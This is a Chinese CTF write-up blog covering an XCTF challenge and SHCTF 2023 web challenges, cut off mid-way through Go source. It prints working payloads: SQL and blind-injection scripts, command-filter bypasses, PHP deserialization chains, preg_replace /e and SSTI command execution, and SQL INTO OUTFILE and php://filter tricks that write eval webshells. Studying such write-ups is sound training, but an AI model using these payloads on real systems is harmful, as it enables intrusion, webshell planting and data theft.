因此用户名：admin’%0Aor%0A’1’&gt;‘0’%0Aor%0Aname%0Alike%0A’admin 密码：123（随便） 注意一定要使用hackbar进行登录，用主页登录没有反应，如图： 但这个页面似乎什么也点击不了，之后就开始写脚本了 import requests s=requests.session() flag='' for i in range(1,50): p='' for j in range(1,255): # (select ascii(substr(id, \"+str(i)+\", 1)) from Flag where id &lt; 2) &lt; ' payload = \"(select%0Aascii(substr(id,\"+str(i)+\",1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;'\"+str(j)+\"'\" #print payload url=\"http://111.200.241.244:57001/zhuanxvlogin?user.name=admin'%0Aor%0A\"+payload+\"%0Aor%0Aname%0Alike%0A'admin&amp;user.password=1\" r1=s.get(url) if len(r1.text)&gt;20000 and p!='': flag+=p print(i,flag) break p=chr(j) 这里可以爆出flag 做了这道题发现很多知识都不清楚的，感觉不熟悉Java和xml代码结构，很难看懂，亦或许我太菜了。不过下载之后得针对本篇文章学习一些小知识了：struct2框架基本信息、HSQL语句以及在熟悉一下xml结构。总之，这篇文章值得反复观看。 参考文章 mysql万能密钥_攻防世界-web-Zhuanxv（任意文件读取、万能密钥、sql盲注 ） xctf攻防世界 Web高手进阶区 Zhuanxv","categories":["攻防世界"]},{"title":"SHCTF 2023-wp","path":"/2023/10/02/2023shctf/","content":"0x01 前言 最近新生比赛太多了，一打开全是web题，看着就爽(bushi，做下来之后发现一点都不新生┭┮﹏┭┮，可能是我太菜了。但总体下来感觉每个赛事都还不错，要说最有难度的还是moectf了，很烦。但总体体验下来还是SHCTF舒服，平台绚丽、体验感也贼好等等（反正各种舒服吧），更何况还是\"山河CTF\"，我就是山河人啊┭┮﹏┭┮。话不多说开始写wp 0x02 玩转题目 先从最简单的开始吧 WEB [WEEK1]飞机大战 首先依旧是亲切无比的游戏，我们先点开看看 嗯~~，非常熟悉的嘲讽，那我们按照常规思路直接审计一下相关js代码，进控制台查找 进去的时候看到敏感字符score，那猜测应该是修改score以达到获取flag，我们继续跟踪score 这里是一些对score的判断 看到上图的时候发现是对score达到要求的函数操作，但似乎没有用的信息，于是我墨迹了一会儿想到，游戏失败会弹窗，那成功了大概率也是弹窗。凭借此思路我们可以想到是否可以找到关于\"游戏胜利的处理函数\"看看内部有什么信息，于是我继续找发现了won函数（类似win：胜利） 如图发现alert弹窗函数，以及uniccode编码字符串，那我们解码一下看看 嗯！亲切的base64，解码即可得到flag [WEEK1]babyRCE &lt;?php $rce = $_GET['rce']; if (isset($rce)) { if (!preg_match(\"/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\&gt;|\\&lt;|\\'|\\\"/i\", $rce)) { system($rce); }else { echo \"hhhhhhacker!!!\".\" \"; } } else { highlight_file(__FILE__); } 很明显的rce嘛，但是过滤了很多，这里我也是比较菜记不住那么多知识点，只是在遇到的时候在网上冲浪找相关payload，于是乎翻到了如下： []中括号匹配绕过 例如**[a-c]** 代表匹配 a-b之间的字符,包括a,b字符本身 匹配范围为当前目录，例子如下 /[a-c][h-j][m-o]/[b-d]a[s-u] flag.txt 相当于 /bin/cat flag.txt 因为[]匹配范围只在当前路径 所以要为bin绝对路径 一定要注意绝对路径，相对路径是不可以的！ 随后参考上述可以构造如下payload： /[a-c][h-j][m-o]/[b-d]a[s-u]${IFS}/fl?g 也就是:/bin/cat flag;?:表示通配字符0或,也就是可以匹配任意一个字符 ${IFS}在linux中可以代替空格 这里选/flag原因是通过构造ls${IFS}/得到的，只输入ls也会发现flag.php，不过这是假的 [WEEK1]登录就给flag 首页如下，这里只能在登录页面转悠，没什么信息的 当时我想复杂了，先用dirsearch扫了扫，又bp抓包看了看，什么也没发现，最后尝试了万能密码和sql注入均无果，我以为这道题很难的，结果一位师傅告诉我直接弱口令啊，我还纳闷呢，我也试过啊，没这么简单吧。但我又想到我当时只是尝试了一下，随后我又去尝试，发现真的很简单： 直接admin：password就登陆进去了。。。。。。。。 拿到flag [WEEK1]生成你的邀请函吧~ 首页如下，再结合题目给的信息： API：url/generate_invitation Request：POST application/json Body：{ \"name\": \"Yourname\", \"imgurl\": \"http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg\" } 使用POST json请求来生成你的邀请函吧~flag就在里面哦~ 很显然就是抓包修改为上述格式即可，但这里注意不必放到repeater直接修改后放包即可，不然出来的图片你看不到，只能是一堆乱码 添加指定url后抓包修改 未修改前如上图；修改后如下图： 直接放包即可 放包之后会发现浏览器自动下载了图片 ，访问看到如下图flag，这里我是发到了微信直接利用微信的自带图片提取文字功能，大家有别的办法也可以 [WEEK1]1zzphp &lt;?php error_reporting(0); highlight_file('./index.txt'); if(isset($_POST['c_ode']) &amp;&amp; isset($_GET['num']))//判断参数是否存在 { $code = (String)$_POST['c_ode'];//强制转换为字符串类型后赋值 $num=$_GET['num'];//正常赋值 if(preg_match(\"/[0-9]/\", $num))//正则匹配 { die(\"no number!\"); } elseif(intval($num))//转换为整数类型 { if(preg_match('/.+?SHCTF/is', $code))//还是正则匹配 { die('no touch!'); } //找寻code字符串中第一次出现指定字符串的位置 if(stripos($code,'2023SHCTF') === FALSE) { die('what do you want'); } echo $flag; } } emmm有难度的PHP特性（只怪我刷太少，太菜了┭┮﹏┭┮） 这里也是废了很长时间，最后也是百度找到的思路 首先第一个正则的话，做题多了就知道preg_match函数的特性：不能处理数组类型（会返回false），那我们直接将num赋值为：num[]=1，在之后的intval作用下会转换成1，即可绕过。 第二个呢是正则与stripos的配合绕过，分析得该正则要求你的code参数不能为SHCTF，且SHCTF前面不能有任意字符，但后续的stripos要求你的code参数必须含有2023SHCTF，所以这里花了我很长时间。 在此期间我尝试了数组等等，但均无果，之后网上漫游发现可以利用正则最大回溯绕过。那我们先来学习一下该知识点，先放出参考文章： PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 这篇文章很顶，解释的我都能看懂(^▽^)，但由于我概述能力不好，就结合别人的话语来阐释： ​ 简单来说就是正则表达式匹配的时候某个.*将后面的字符全部匹配到了，导致表达式后面的式子没有地方匹配，因此一个一个字符吐出来，直到后面的式子全部匹配完毕或者回溯次数过多导致正则直接返回false：当然上述表述的前提下是要求正则表达式处于非贪婪模式或者NFA模式 NFA模式：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态（所谓的回溯也就是在返回前面的字符串进行重新匹配，直到正则表达式匹配完全），具体可参考上述文章。 非贪婪模式： if(preg_match('/UNION.+?SELECT/is', $input)) { die('SQL Injection'); } 如同上述表达式如果我输入该语句：UNION/*aaaaa*/SELECT，这个正则表达式执行流程如下： .+?匹配到/ 因为非贪婪模式，所以.+?停止匹配，而由S匹配* S匹配*失败，回溯，再由.+?匹配* 因为非贪婪模式，所以.+?停止匹配，而由S匹配a S匹配a失败，回溯，再由.+?匹配a ... 回溯次数随着a的数量增加而增加。所以，我们仍然可以通过发送大量a，来使回溯次数超出pcre.backtrack_limit限制，进而绕过WAF： 注意正则匹配中的 ^.*、.*$、.*就可以使用回溯，怎么回溯呢，只能上脚本了，因为一百万个字符，总不可能手写。我这里也是问GPT得到的脚本，因为我菜狗不会写┭┮﹏┭┮ import requests # 定义目标 URL url = 'http://112.6.51.212:30422/?num[]=1' # 请将此处的 URL 替换为你要访问的实际 URL # POST 请求参数 prefix_a = 'a' * 1000000 post_params = {'c_ode': prefix_a + '2023SHCTF'} # 发送 POST 请求并获取响应 post_response = requests.post(url, data=post_params) # 检查 POST 请求的响应 if post_response.status_code == 200: print(\"POST 请求成功\") print(\"POST 响应内容:\", post_response.text) else: print(\"POST 请求失败\") 思路就是对该url进行请求，并传入相应的get和post参数，但在2023SHCTF之前要加入一百万个字符a，即可绕过 成功拿到flag [WEEK1]ez_serialize &lt;?php highlight_file(__FILE__);//高亮代码 class A{ public $var_1; public function __invoke(){//需要当对象被当成一个方法(也就是函数)调用时,invoke会自动调用 include($this-&gt;var_1);//这里一看就知道是敏感函数，大概是用来伪协议读取的 } } class B{ public $q; public function __wakeup()//当开始反序列化的时候，wakeup会被自动调用 { if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;q)) { echo \"hacker\"; }//虽然这里的正则过滤的很多，但没啥用，可以忽略 } } class C{ public $var; public $z; public function __toString(){//当一个类被当做字符串使用时，会自动调用 return $this-&gt;z-&gt;var; } } class D{ public $p; public function __get($key){//当读取不可访问的属性的值时调用 $function = $this-&gt;p; return $function(); } } if(isset($_GET['payload']))//简单的传参 { unserialize($_GET['payload']); } ?&gt; 很简单的序列化题，结合上述对代码的分析我们可以构造如下链子： 首先看准敏感函数include，这里肯定是用来读取php文件的，那这个函数肯定是我们的目标，那么我们想要调用invoke，就需要A对象被当做一个函数去调用，那我们可以找到D类中的return $function();符合我们的要求。 那想要调用其所在的get函数，就需要读取一个不可访问的属性，那我们又可以看到return $this-&gt;z-&gt;var;很明显如果我们令z指向对象D，那z-&gt;var相当于D-&gt;var，但很显然D中没有var属性，那便成功调用get函数了。 那我们想要调用其所在的tostring函数，就需要当一个类被当做字符串时会调用，那我们又可以发现wakeup里面的正则匹配，其中$this-&gt;q被认作字符串，那完全可以将q赋值为C类，即可走通链子。 至于wakeup的调用，反序列化的时候就会被自动调用，我们不必考虑。那么poc如下： &lt;?php //highlight_file(__FILE__); class A{ public $var_1; } class B{ public $q; } class C{ public $var; public $z; } class D{ public $p; } $poc = new B(); $poc-&gt;q = new C(); $poc-&gt;q-&gt;z=new D(); $poc-&gt;q-&gt;z-&gt;p=new A(); $poc-&gt;q-&gt;z-&gt;p-&gt;var_1='php://filter/convert.base64-encode/resource=flag.php'; echo urlencode(serialize($poc)); ?&gt; 直接base64解码即可 得到flag [WEEK1]ezphp &lt;?php error_reporting(0); if(isset($_GET['code']) &amp;&amp; isset($_POST['pattern'])) { $pattern=$_POST['pattern']; if(!preg_match(\"/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\\.|\\`|read*|show|file|\\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\\/| |\\?|mv|cp|next|show_source|highlight_file|glob|\\~|\\^|\\||\\&amp;|\\*|\\%/i\",$code)) { $code=$_GET['code']; preg_replace('/(' . $pattern . ')/ei','print_r(\"\\\\1\")', $code); echo \"you are smart\"; }else{ die(\"try again\"); } }else{ die(\"it is begin\"); } ?&gt; it is begin 一看到这过滤的真的是吓到我了，但往往这么可怕的情况下就会有bug，我们查看一番发现，竟然没过滤 passthru()函数，好好好这么玩是吧~~~ 这个函数与system类似，用法也一致。重点是 preg_replace('/(' . $pattern . ')/ei','print_r(\"\\\\1\")', $code);此处的代码我们如何看懂 我这里也是看不懂，于是选择网上冲浪看看有机会没有，结果还真有类似的^_^，下面我就跟着那些佬的思路学习一下。 先介绍一个PHP特性吧： php自身在解析请求的时候，如果参数名字中包含空格、.、[等字符，会将他们转换成_。 $a = $_GET; var_dump($a); ?&gt; 首先我们知道 preg_replace 的 /e 修正符会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行，前提是 subject 中有 pattern 的匹配。 既然是这样我们看一张图。 图中实际上通过 eval 执行的是 strtolower 函数。分别实际执行的是： strtolower(\"JUST TEST\"); strtolower(\"PHPINFO()\"); strtolower(\"{${PHPINFO()}}\"); 第三个之所以可以执行代码，是因为我们通过复杂(花括号)语法的方式来让其代码执行。 然后在看：这里的 replacement 是 strtolower(“\\\\1”) ，着重理解一下 \\\\1 。 \\\\1 在正则中存在自己的作用，其实就是匹配第一项 这里给出例子 preg_replace('/(' . $regex . ')/ei', 'strtolower(\"\\\\1\")', $value); regex是我们的参数值 即 get的名称 value是传入的参数 .*=phpinfo() 所以就变为了 preg_replace('/(.*)/ei', 'strtolower(\"\\\\1\")',phpinfo()); 但这里无法执行phpinfo() 要变为：{${phpinfo()}}，首先要知道 $a=hello $$a=world 这里相当于 $hello=world 所以 echo $a $hello 为：hello world 我们接着理解一下 ${phpinfo()} 执行完会变为 ${1} 因为 phpinfo()通过var_dump返回的是1 所以strtolower 变为 strtolower({${1}}) 接着变为 strtolower({null}) 但似乎后面的对strtolower的解释无关紧要，我认为之主要注意通过${}来解析phpinfo()，否则无法进行命令执行 但有注意到PHP的特性会将.这类特殊符号转化为_，因此那些佬就换为了\\S*（我不了解正则表达式，因此问了GPT）发现他俩作用在这里是相通的，不过某些细节不一致罢了 /(.*)/: 这部分正则表达式匹配整个输入字符串，并捕获它到一个分组中。 .* 匹配任意字符（除了换行符 ），.* 的括号 ( ) 将匹配的内容捕获到一个分组中，以后可以在替换中使用。 (\\S*)：这个部分表示匹配零个或多个非空白字符（非空格、非制表符、非换行符等），并将其捕获到分组中。 然后我们就可以想到构造如下payload： GET：code={${passthru(ls)}} POST：pattern=\\S* 不过考虑到过滤的很多，我就将其换为了ASCII码值来替换，脚本如下 # 输入字符串 input_str = \"ls\" # 初始化一个空字符串来存储结果 output_str = \"\" # 遍历输入字符串中的每个字符 for char in input_str: # 获取字符的 ASCII 码值，并将其转换为字符串 ascii_value = ord(char) # 格式化输出，拼接到结果字符串中 output_str += f\"chr({ascii_value}).\" # 去除最后一个多余的点号 output_str = output_str.rstrip(\".\") # 打印结果 print(output_str) 结果为：ls-&gt;chr(108).chr(115) ls /-&gt;chr(108).chr(115).chr(32).chr(47) 等等 最终payload为： code=${passthru(chr(99).chr(97).chr(116).chr(32).chr(105).chr(110).chr(100).chr(101).chr(120).chr(46).chr(112).chr(104).chr(112))} pattern=\\S* 找到flag 但这里不懂得点为：似乎非得转换为ASCII才能执行成功 [WEEK2]no_wake_up 直接点击看看，简单的反序列化 &lt;?php highlight_file(__FILE__); class flag{ public $username; public $code; public function __wakeup(){ $this-&gt;username = \"guest\"; } public function __destruct(){ if($this-&gt;username = \"admin\"){ include($this-&gt;code); } } } unserialize($_GET['try']); 首先就是找敏感函数，很显然为include，这个可以产生文件包含漏洞。那我们看看如何调用该函数所在方法：destruct，这个函数会在对象被销毁的时候自动调用，并且只要满足username=admin即可。但在反序列化的时候，由于会自动调用wakeup方法而使username被赋值为guest，这样会导致username!=admin而无法调用include函数。因此我们要想办法绕过wakeup方法的调用 利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 我们直接看poc来理解上句话 &lt;?php highlight_file(__FILE__); class flag{ public $username; public $code; } $poc = new flag(); $poc-&gt;username = 'admin'; $poc-&gt;code = 'php://filter/convert.base64-encode/resource=flag.php'; echo serialize($poc); ?&gt; 输出如下： O:4:\"flag\":2:{s:8:\"username\";s:5:\"admin\";s:4:\"code\";s:52:\"php://filter/convert.base64-encode/resource=flag.php\";} 我们只修要做如下更改，将上述的2改为其他数字即可（这里我改成了3）： O:4:\"flag\":3:{s:8:\"username\";s:5:\"admin\";s:4:\"code\";s:52:\"php://filter/convert.base64-encode/resource=flag.php\";} base64解码即可，如下图拿到flag [WEEK2]ez_ssti 经典页面，我们直接拼接url看看，这里我也是猜测需要get传参name，如下图 发现被成功解析执行，那我们跟着常规思路一步步尝试 1.首先考虑拿到一个class，通过字符串、元组、列表、字典均可。 {{''.__class__}} #这里我选择字符串 2.下一步目的是拿到object基类。 {{''.__class__.__base__}} 3.然后获取对应子类。 {{''.__class__.__base__.__subclasses__()}} 接下来就是寻找可用的类，比如命令执行类，文件读写类等等，这里可以全局搜索或者写一个脚本来搜索 这里找到之后发现&lt;class ‘os._wrap_close’&gt;是位于第132个，我们直接利用即可 5.通过某些手段找到某个函数是可用的，下一步利用这个类的__init__函数获取到__globals__全局变量，再获取到__globals__全局变量里的__builtins__中的eval函数。 随后导入os模块利用popen函数进行命令执行 ?name={{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}} 如图根目录发现flag，直接读取即可 [WEEK2]EasyCMS 点开是一个网站内容管理系统叫做taoCMS，那我的思路是直接百度看看有何漏洞，尝试复现利用 百度之后有很多文章，不过这里我目前测试过的可以利用sql注入以及文件上传，一会儿参考文章放在下面，开始复现： 首先看了百度的文章发现了后台管理路径 /admin/admin.php?action=frame&amp;ctrl=iframes 直接访问看看 发现要登录，不过这里很幸运利用网站的默认密码就进去了：admin，tao 方法一：sql命令执行 进入后台如上图会有两处利用点，一个是执行SQL，一个是文件管理。我们先看sql吧，这里没有过滤，我们直接尝试sql语句向网站中写入一句话木马文件 select \"&lt;?php @eval($_POST[1];?&gt;)\" into outfile '/var/www/html/flag.php' 或 select \"&lt;?php system('cat /flag');?&gt;)\" into outfile '/var/www/html/flag.php' 写入后直接url后面访问上述文件即可 这里我失误了，于是又写了一个cat.php，不用在意直接拿到flag 方法二：文件上传 直接点击文件管理 如上图，我看许多文件都会在htaccess文件中写入 AddType application/x-httpd-php .php3 来确保系统会以php解析php3后缀文件，于是直接向php3文件写入一句话木马来利用 但我这里写入之后访问会发现直接下载了，所以我认为这个点在这里并不能利用，不过我们直接向后台创建写入一个php木马文件即可，不需要上述那样麻烦 如上图我们直接访问 可以看到成功解析，后续就不再赘述了 上述复现可参考：春秋云境：CVE-2022-23880（taoCMS v3.0.2 任意文件上传漏洞） 参考文章 [BJDCTF2020]ZJCTF，不过如此 preg_replace /e模式漏洞 [BJDCTF2020]ZJCTF，不过如此 https://blog.csdn.net/weixin_33006121/article/details/114357320?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=preg_replace(%27/(%27%20.%20 [WEEK2]serialize &lt;?php highlight_file(__FILE__); class misca{ public $gao; public $fei; public $a; public function __get($key){ $this-&gt;miaomiao(); $this-&gt;gao=$this-&gt;fei; die($this-&gt;a); } public function miaomiao(){ $this-&gt;a='Mikey Mouse~'; } } class musca{ public $ding; public $dong; public function __wakeup(){ return $this-&gt;ding-&gt;dong; } } class milaoshu{ public $v; public function __tostring(){ echo\"misca~musca~milaoshu~~~\"; include($this-&gt;v); } } function check($data){ if(preg_match('/^O:\\d+/',$data)){ die(\"you should think harder!\"); } else return $data; } unserialize(check($_GET[\"wanna_fl.ag\"])); 虽然是简单的反序列化，但其中还是很多考点的。我们先总体分析一波。 老思路先找敏感函数，很明显就是include函数了，接下来我们看如何利用其所在的tostring魔术方法： 搜寻一番发现get魔术方法里面存在die(变量)意思是程序结束前将该变量以字符串形式输出，那不就来了嘛，这里显然就是调用tostring的点。 接下来看如何调用get魔术方法： __get()，读取不可访问属性的值时调用 那根据上述利用条件我们可以找到wakeup魔术方法中的return语句，这就是我们要利用的点，至于wakeup的方法调用很简单，反序列化即可。 综上所述链子为：musca.wakeup-&gt;misca.get-&gt;milaoshu.tostring-&gt;include 接下来就是赋值问题了，这里先上pop &lt;?php class misca{ public $gao; public $fei; public $a; } class musca{ public $ding; public $dong; } class milaoshu{ public $v; } $poc = new musca(); $poc-&gt;ding = new misca(); $poc-&gt;ding-&gt;fei = new milaoshu(); $poc-&gt;ding-&gt;a = &amp;$poc-&gt;ding-&gt;gao; $poc-&gt;ding-&gt;fei-&gt;v = 'php://filter/convert.base64-encode/resource=flag.php'; echo serialize(array($poc)); ?&gt; 这里我们看到上述采用了引用的点，这里是为了绕过misca对象中miaomiao函数对其a属性的值的改变。 剩下的还有绕过最开始的正则检测，这里当时我是直接修改前面的O:5为O:+5，这个其实是可以绕过的，不过很奇怪这道题打不通，后来思索了一番发现，用这种办法似乎会终止反序列化的进程。于是换了一种方法，只需要用array包围要序列化的变量即可。因为该正则就是检验序列化的字符串是否是对象字符串开头。–这里看了官方wp的解释是：+这种方式会受到PHP版本限制 最后就是传参问题了，这里需要以wanna[fl.ag这种方式传参，如下图解密即可得到flag [WEEK2]MD5的事就拜托了 &lt;?php highlight_file(__FILE__); include(\"flag.php\"); if(isset($_POST['SHCTF'])){ extract(parse_url($_POST['SHCTF'])); if($$$scheme==='SHCTF'){ echo(md5($flag)); echo(\"&lt;/br&gt;\"); } if(isset($_GET['length'])){ $num=$_GET['length']; if($num*100!=intval($num*100)){ echo(strlen($flag)); echo(\"&lt;/br&gt;\"); } } } if($_POST['SHCTF']!=md5($flag)){ if($_POST['SHCTF']===md5($flag.urldecode($num))){ echo(\"flag is\".$flag); } } 当时这道题也是很费脑子且没做出来。。。当时对于$$$scheme这一块儿走通了，但在最后的md5比较就不懂了，如今wp出来了，学习一波。 看了之后发现是考察md5补充攻击。。。没听说过，在此之前我们先拿到flag的md5值和长度再说。 这里关键就是extract与parse_url函数的配合了 这里认真看上面的代码我认为就可以理解了，这里extract函数就是将键名但最变量，键值当做变量的值而已，所以重点是理解parse_url函数，看题目要求我们$$$schema=指定字符串，$num*100!=intval($num*100)后面的我们用浮点类型即可绕过，而前面的payload如下 SHCTF=host://SHCTF:password@user length=1.1 得到md5值和长度分别为： 8504ce3799001a7aecb62ec74d3835a5 42 这里就先直接复现一波，后续原理的学习另起一篇文章，漏洞利用工具如下： https://github.com/shellfeel/hash-ext-attack 下载zip安装相关依赖，直接运行py文件，根据提示输入内容 这里我是只输入hash和长度了，之后他给了我们新明文以及hash，我们分别给length和SHCTF赋值即可 拿到flag [WEEK2]ez_rce 暂时不会。。。 咳咳来补充了（靠官方wp from flask import * import subprocess app = Flask(__name__) #此函数用于遍历并从对象中提取属性。它接受一个对象（obj）和属性名称的列表（arg），然后返回最终属性。 def gett(obj,arg): tmp = obj for i in arg: tmp = getattr(tmp,i) return tmp #这个函数类似于gett，但用于设置一个具有指定值（num）的属性。 def sett(obj,arg,num): tmp = obj for i in range(len(arg)-1): tmp = getattr(tmp,arg[i]) setattr(tmp,arg[i+1],num) #它从subprocess中提取特定属性，将其转换为列表，使用给定的索引num和布尔值bol修改列表中的特定元素，然后将属性设置回修改后的列表。 def hint(giveme,num,bol): c = gett(subprocess,giveme) tmp = list(c) tmp[num] = bol tmp = tuple(tmp) sett(subprocess,giveme,tmp) #这个函数用于使用subprocess.call方法执行Shell命令。 def cmd(arg): subprocess.call(arg) @app.route('/',methods=['GET','POST']) def exec(): try: if request.args.get('exec')=='ok': shell = request.args.get('shell') cmd(shell) else: exp = list(request.get_json()['exp']) num = int(request.args.get('num')) bol = bool(request.args.get('bol')) hint(exp,num,bol) return 'ok' except: return 'error' if __name__ == '__main__': app.run(host='0.0.0.0',port=5000) 附件给了我们源码，这里配合GPT做了一波审计，下面附上关键函数的用法截图： 这里分析了一波，我们来搞一下思路，这里的代码可以实现修改subprocess函数的某些属性，如果我们传入恶意数据就可以修改我们想要的属性的值了。 这里我们可以json传入数据，也就是传入subprocess函数的某些参数，随后num定位我们想要修改的参数位置，bol是修改参数的布尔值，这样传入之后可以通过gett，sett函数的配合，将参数的布尔值修改为我们想要的布尔值。–这里也是通过wp学到了一些审计代码的小知识吧。我们将代码通过pycharm打开来搜索一些代码 如上图我们看到敏感函数call，我们跟踪看一下 我们看到这里接受三个参数，但实际有执行功能的似乎是popen，我们继续跟踪看一下 我们看到其init属性中存在诸多参数，其中有shell的默认值为false，我们看一下官方的提示： Subprocess.call函数有一个参数shell，当shell为True时，执行命令时是/bin/sh -c “$cmd”这样的，可以进行命令注入。而当shell为false时，执行命令时是/bin/cmd arg这种。而这个方法的shell参数默认为false。 因此我们要令shell为true才可以，这里就是想办法修改其布尔值了 根据函数的默认参数保存在defaults属性中，我们在终端看一下其位置 如上图可以看到位置在第八个，也就是下标为7，我们给num赋值为7即可 我们构造如下payload，注：json格式，bol为字符串，exp的格式为数组（用来被gett遍历） { \"exp\":[ \"Popen\", \"__init__\", \"__default__\" ] } get传参：?num=7&amp;bol=true&amp;shell=mkdir%20./static;cat%20/flag&gt;./static/1.txt&amp;exec=oka 接下来令exec不为ok即可进入else语句–这里注意content-type的内容 下面要get传参，令exec=ok进入cmd命令执行状态 拿到flag [WEEK3]快问快答 直接看题目源码，很明显是要写脚本的，由于本人太菜，所以就跟着别的佬去写了。 import requests import re import time def post_answer(url, headers, answer, cookie):#发送请求 answer1 = {'answer': answer} response=requests.Session() response = response.post(url, headers=headers, data=answer1,cookies=cookie)#这个需要设cookie，因为每道题的cookie都是不同的 return response def parse_question(response):#用于计算答案 html = response.text answer=0 pattern = re.compile(r\"&lt;h3&gt;(.*?)&lt;/h3&gt;\")#(.*?)：这是正则表达式的一部分，用于捕获任何字符（除了换行符 ）零次或多次，非贪婪地匹配，其中的r是为了让其中的反斜杠字符视为普通字符 match = pattern.search(html) if match: question = match.group(1) numbers = re.findall(r\"\\d+\", question) operation = re.findall(r'异或|与|\\+|-|x|÷', question)#识别运算符 op=operation[0] if len(numbers) == 2: a = int(numbers[0]) b = int(numbers[1]) if op == \"异或\": answer = a ^ b if op == \"与\": answer = a &amp; b if op == \"-\": answer = a - b if op == \"+\": answer = a + b if op == \"x\": answer = a * b if op == \"÷\": answer = int(a/b)#这里要特别注意要强转成整形，因为题目只能提交整数，如果不转，脚本运行的时候，会因为提交无效数据而爆500的错误 #print(question) #print(answer) else: print(\"找不到题目\") return answer url = \"http://112.6.51.212:32776/\" # 这里替换为你要访问的网址 headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"} cookie=0 answer = 0 for i in range(1,52):#这里要设置成52，相当于循环了51次，因为第一次是初始化，答案是错的 time.sleep(1)#这里是为了别让程序答得太快，因为题目答题速度是1到2秒之间 response = post_answer(url, headers, answer, cookie) print(response.text)#打印表单 answer = parse_question(response) cookie = response.cookies 拿到flag，感觉这个脚本还是有难度的。。。。我先练习一波 之后又研究了一波代码，发现match.group(1)此处是必须为1的，如果为0输出如下：很明显会导致我们后续对数字的判断错误 [WEEK3]sseerriiaalliizzee &lt;?php error_reporting(0); highlight_file(__FILE__); class Start{ public $barking; public function __construct(){ $this-&gt;barking = new Flag; } public function __toString(){ return $this-&gt;barking-&gt;dosomething(); } } class CTF{ public $part1; public $part2; public function __construct($part1='',$part2='') { $this -&gt; part1 = $part1; $this -&gt; part2 = $part2; } public function dosomething(){ $useless = '&lt;?php die(\"+Genshin Impact Start!+\");?&gt;'; $useful= $useless. $this-&gt;part2; file_put_contents($this-&gt; part1,$useful); } } class Flag{ public function dosomething(){ include('./flag,php'); return \"barking for fun!\"; } } $code=$_POST['code']; if(isset($code)){ echo unserialize($code); } else{ echo \"no way, fuck off\"; } ?&gt; no way, fuck off 这道题目链子很容易分析，tostring魔术方法的调用在echo 反序列化处就会调用的，难点是利用点在CTF类中的$useful= $useless. $this-&gt;part2;处，但我们可以看到他之前是有一个内容为php代码，其中含有die，这会导致程序的直接退出。此时让我想到了PHP的死亡die绕过，记得p神讲过的： 谈一谈php://filter的妙用–我只能说讲得真通俗易懂，这里截取关键部分 幸运的是，这里的$_POST['filename']是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除“死亡exit”。 众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。 所以，一个正常的base64_decode实际上可以理解为如下两个步骤： &lt;?php $_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']); base64_decode($_GET['txt']); 所以，当$content被加上了&lt;?php exit; ?&gt;以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。 “phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，\"phpexita\"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是&lt;?php exit; ?&gt;没有了。 根据上述理论我们看一下&lt;?php die(\"+Genshin Impact Start!+\");?&gt;在经过base64解码的时候会将&lt;、?、;、(、)忽略，也就是说最后只剩下phpdie+GenshinImpactStart+共26个字符，考虑到base64特性我们需要增添两个字符使其为4的倍数也就是28，最终payload如下： &lt;?php class Start{ public $barking; } class CTF{ public $part1; public $part2; } $poc = new Start(); $poc-&gt;barking = new CTF(); $poc-&gt;barking-&gt;part1 = 'php://filter/write=convert.base64-decode/resource=cmd.php'; $poc-&gt;barking-&gt;part2 = 'aaPD9waHAgQGV2YWwoJF9QT1NUWydoeWJjeCddKTs/Pg=='; //注意这里前面有两个字符aa echo serialize($poc); ?&gt; 上传访问即可 拿到flag 另外的各种姿势还可参考：file_put_contents利用技巧(php://filter协议) [WEEK3]gogogo 这道题根据附件来看是一道go语言审计题目，这也是第一次遇见。。。先自己审计一波 main.go package main import ( \"main/route\" \"github.com/gin-gonic/gin\" ) func main() { r := gin.Default() r.GET(\"/\", route.Index) r.GET(\"/readflag\", route.Readflag) r.Run(\"0.0.0.0:8000\") } route.go package route import ( \"github.com/gin-gonic/gin\" \"github.com/gorilla/sessions\" \"main/readfile\" \"net/http\" \"os\" \"regexp\" ) var store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\"))) func Index(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] == nil { session.Values[\"name\"] = \"User\" err = session.Save(c.Request, c.Writer) if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } } c.String(200, \"Hello, User. How to become admin?\") } func Readflag(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] == \"admin\" { c.String(200, \"Congratulation! You are admin,But how to get flag? \") path := c.Query(\"filename\") reg := regexp.MustCompile(`[b-zA-Z_@#%^&amp;*:{|}+&lt;&gt;\";\\[\\]]`) if reg.MatchString(path) { http.Error(c.Writer, \"nonono\", 